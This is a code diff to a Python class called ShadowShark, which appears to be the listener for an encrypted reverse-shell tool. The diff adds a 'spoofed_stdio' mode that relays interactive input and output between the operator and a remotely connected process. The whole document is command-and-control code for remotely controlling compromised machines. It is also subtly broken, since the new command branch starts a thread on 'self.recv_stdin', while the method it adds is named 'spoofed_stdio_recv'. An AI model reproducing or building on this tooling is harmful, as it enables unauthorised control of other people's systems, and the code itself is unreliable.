@@ -10,6 +10,7 @@ import json
 import socket
 import codecs
 import binascii
+import threading
 from lib.listener import colors
 from lib.common import cc
 
@@ -73,6 +74,22 @@ class ShadowShark:
         data = self.encryption_handler(data, decode=True)
         return data
 
+    def spoofed_stdio_send(self):
+        while True:
+            command = input()
+            self.connection.send(self.encryption_handler(command, encode=True))
+
+    def spoofed_stdio_recv(self):
+        spoofed_stdio_send_thread = threading.Thread(target=self.spoofed_stdio_send, daemon=True)
+        spoofed_stdio_send_thread.start()
+        while True:
+            output = self.connection.recv(1024)
+            output = self.encryption_handler(output, decode=True)
+            if output == 'exit':
+                spoofed_stdio_send_thread.join()
+                sys.exit()
+            print(output, end='')
+
     def listen(self):
         '''Accept the first incoming TCP connection.'''
         try:
@@ -109,6 +126,14 @@ class ShadowShark:
                         self.connection.close()
                         self.rev_socket.close()
                         sys.exit()
+                    if command.startswith('spoofed_stdio'):
+                        if len(command.split()) >= 2:
+                            self.connection.send(self.encryption_handler(command, encode=True))
+                            spoofed_stdio_recv_thread = threading.Thread(target=self.recv_stdin, daemon=True)
+                            spoofed_stdio_recv_thread.start()
+                        else:
+                            print('Use spoofed_stdio in the format spoofed_stdio COMMAND.')
+                            continue
                     if command == 'multiline':
                         print(f'{colors.YELLOW}\n[!] Press Ctrl + d once you are finished.{colors.NORMAL}')
                         command = sys.stdin.read()
